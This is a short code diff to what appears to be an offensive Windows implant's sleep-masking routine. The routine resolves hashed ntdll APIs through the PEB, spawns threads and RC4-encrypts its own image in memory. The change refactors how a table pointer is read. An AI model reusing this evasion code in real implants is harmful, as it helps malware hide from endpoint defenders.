@@ -214,6 +214,7 @@ static D_SEC( E ) VOID WINAPI ObjectFiber( _In_ PF_PARAM Fbr )
 	HANDLE				Evt = NULL;
 	LPVOID				Adv = NULL;
 	LPVOID				Img = NULL;
+	PTABLE				Tbl = NULL;
 	PIMAGE_DOS_HEADER		Dos = NULL;
 	PIMAGE_NT_HEADERS		Nth = NULL;
 
@@ -244,8 +245,10 @@ static D_SEC( E ) VOID WINAPI ObjectFiber( _In_ PF_PARAM Fbr )
 	Dos = C_PTR( NtCurrentPeb()->ImageBaseAddress );
 	Nth = C_PTR( U_PTR( Dos ) + Dos->e_lfanew );
 
-	Img = C_PTR( ( ( PTABLE ) G_SYM( Table ) )->RxBuffer );
-	Len = U_PTR( ( ( PTABLE ) G_SYM( Table ) )->RxLength );
+
+	Tbl = C_PTR( *( PVOID * )( G_SYM( Table ) ) );
+	Img = C_PTR( Tbl->RxBuffer );
+	Len = U_PTR( Tbl->RxLength );
 
 	Api.NtSignalAndWaitForSingleObject = PeGetFuncEat( PebGetModule( H_LIB_NTDLL ), H_API_NTSIGNALANDWAITFORSINGLEOBJECT );
 	Api.NtQueryInformationThread       = PeGetFuncEat( PebGetModule( H_LIB_NTDLL ), H_API_NTQUERYINFORMATIONTHREAD );
@@ -289,8 +292,8 @@ static D_SEC( E ) VOID WINAPI ObjectFiber( _In_ PF_PARAM Fbr )
 		Key.Buffer = &Rnd;
 		Key.Length = Key.MaximumLength = 0x10;
 
-		Rc4.Buffer = C_PTR( ( ( PTABLE ) G_SYM( Table ) )->RxBuffer );
-		Rc4.Length = Rc4.MaximumLength = U_PTR( ( ( PTABLE ) G_SYM( Table ) )->ImageLength );
+		Rc4.Buffer = C_PTR( Tbl->RxBuffer );
+		Rc4.Length = Rc4.MaximumLength = U_PTR( Tbl->ImageLength );
 
 		if ( NT_SUCCESS( Api.NtCreateEvent( &Evt, EVENT_ALL_ACCESS, NULL, SynchronizationEvent, FALSE ) ) ) {
 			if ( NT_SUCCESS( Api.NtCreateThreadEx( &Th1, THREAD_ALL_ACCESS, NULL, NtCurrentProcess(), Api.NtWaitForSingleObject, NULL, TRUE, 0, 0x1000 * 20, 0x1000 * 1, NULL ) ) ) {
